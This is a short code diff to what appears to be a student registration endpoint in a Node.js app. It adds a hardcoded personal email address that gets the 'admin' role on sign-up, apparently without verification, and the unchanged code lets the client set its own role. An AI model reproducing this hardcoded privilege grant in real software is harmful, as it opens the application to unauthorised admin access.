@@ -264,6 +264,9 @@ const registerStudent = catchErrors(async (req, res) => {
     coordinates: [parseFloat(coordinates.long), parseFloat(coordinates.lat)],
   };
 
+  const allowedEmails = ['ayodejiadebolu@gmail.com'];
+
+  const isAllowedAdmin = allowedEmails.includes(email.trim().toLowerCase());
   const newStudent = await new Student({
     firstName: firstName.toLowerCase(),
     lastName: lastName.toLowerCase(),
@@ -278,7 +281,7 @@ const registerStudent = catchErrors(async (req, res) => {
     DOB,
     address: address.toLowerCase(),
     phoneNumber,
-    role,
+    role: isAllowedAdmin ? 'admin' : role,
   }).save();
 
   const newToken = await new StudentToken({
